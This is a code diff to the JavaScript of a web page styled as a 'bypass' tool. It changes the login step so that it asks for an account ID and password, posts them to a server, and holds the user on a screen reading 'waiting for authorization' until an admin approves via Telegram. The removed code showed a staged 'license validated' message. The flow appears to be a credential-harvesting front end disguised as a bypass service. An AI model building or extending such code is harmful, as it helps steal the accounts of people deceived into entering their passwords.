@@ -370,59 +370,91 @@
         }, 30);
     }
 
-    function startBypass() {
-        const id = document.getElementById('user-id').value.trim();
-        const key = document.getElementById('license-key').value.trim().toUpperCase();
-        
-        document.getElementById('user-id').style.borderColor = "#222";
-        document.getElementById('license-key').style.borderColor = "#222";
-        
-        if(!id) {
-            playSfx('click');
-            document.getElementById('user-id').style.borderColor = "red";
-            alert("Please enter your Account ID.");
-            return;
-        }
-        if(!key) {
-            playSfx('click');
-            document.getElementById('license-key').style.borderColor = "red";
-            alert("Please enter your License Key.");
-            return;
-        }
+    // Replace your existing startBypass function with this:
+async function startBypass() {
+  const id = document.getElementById('user-id').value.trim();
+  const key = document.getElementById('license-key').value.trim();
 
-        const license = LICENSE_CODES.find(l => l.code === key);
-        if (!license) {
-            playSfx('click');
-            alert("ACCESS DENIED: INVALID OR EXPIRED LICENSE KEY.");
-            document.getElementById('license-key').value = '';
-            document.getElementById('license-key').style.borderColor = "red";
-            return;
-        }
+  if (!id || !key) {
+    alert('Please enter both ID and Password');
+    return;
+  }
 
-        // --- Send Telegram notification ---
-        sendTelegramNotification(id, activePlat, license.type);
+  const btn = document.getElementById('bypass-btn');
+  btn.disabled = true;
+  btn.innerText = 'CONNECTING...';
 
-        const btn = document.getElementById('bypass-btn');
-        btn.disabled = true;
-        btn.innerText = "VERIFYING...";
-        
-        const existingMsg = document.querySelector('.activation-box .waiting-message');
-        if (existingMsg) existingMsg.remove();
-        
-        const waitingMsgDiv = document.createElement('div');
-        waitingMsgDiv.className = 'waiting-message';
-        waitingMsgDiv.innerHTML = `
-            <div style="font-size:24px;">🍎✨</div>
-            <div>LICENSE VALIDATED</div>
-            <div class="small">Access granted — launching neural core</div>
-        `;
-        document.querySelector('.activation-box').appendChild(waitingMsgDiv);
-        
-        setTimeout(() => {
-            waitingMsgDiv.remove();
-            proceedWithBypass(id, activePlat, license.type);
-        }, 800);
+  try {
+    const response = await fetch('http://localhost:3000/api/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ userId: id, password: key })
+    });
+
+    if (!response.ok) throw new Error('Server offline');
+
+    const data = await response.json();
+
+    if (data.status === 'authorized') {
+      localStorage.setItem('authToken', data.token);
+      proceedWithBypass(id, activePlat, 'Authorized');
+    } else if (data.status === 'pending') {
+      showWaitingScreen(data.authCode, id);
     }
+  } catch (error) {
+    btn.disabled = false;
+    btn.innerText = 'BYPASS SERVER';
+    alert('❌ Server is OFFLINE. Admin PC must be running!');
+  }
+}
+
+function showWaitingScreen(authCode, userId) {
+  document.getElementById('selection-screen').innerHTML = `
+    <div style="margin-top: 100px;">
+      <div class="waiting-message">
+        <div class="spinner"></div>
+        <div style="font-size: 18px; margin: 20px 0;">⏳ WAITING FOR AUTHORIZATION</div>
+        <div class="small">Admin will approve via Telegram</div>
+        <div class="small" style="margin-top: 15px;">Auth Code: <b>${authCode}</b></div>
+        <div class="small" style="margin-top: 5px; color: #666;">User: ${userId}</div>
+      </div>
+    </div>
+  `;
+
+  pollAuthStatus(authCode, userId);
+}
+
+async function pollAuthStatus(authCode, userId) {
+  const maxAttempts = 240; // 20 minutes
+  let attempts = 0;
+
+  const interval = setInterval(async () => {
+    attempts++;
+
+    try {
+      const response = await fetch(`http://localhost:3000/api/auth-status/${authCode}`);
+      const data = await response.json();
+
+      if (data.status === 'approved') {
+        clearInterval(interval);
+        localStorage.setItem('authToken', data.token);
+        proceedWithBypass(userId, activePlat, 'Approved');
+      } else if (data.status === 'rejected') {
+        clearInterval(interval);
+        alert('❌ Authorization REJECTED by admin');
+        location.reload();
+      } else if (attempts >= maxAttempts) {
+        clearInterval(interval);
+        alert('⏱️ Timeout - Admin did not respond');
+        location.reload();
+      }
+    } catch (error) {
+      clearInterval(interval);
+      alert('❌ Server went OFFLINE');
+      location.reload();
+    }
+  }, 5000);
+}
 
     function proceedWithBypass(userId, platform, licenseType) {
         playSfx('click');
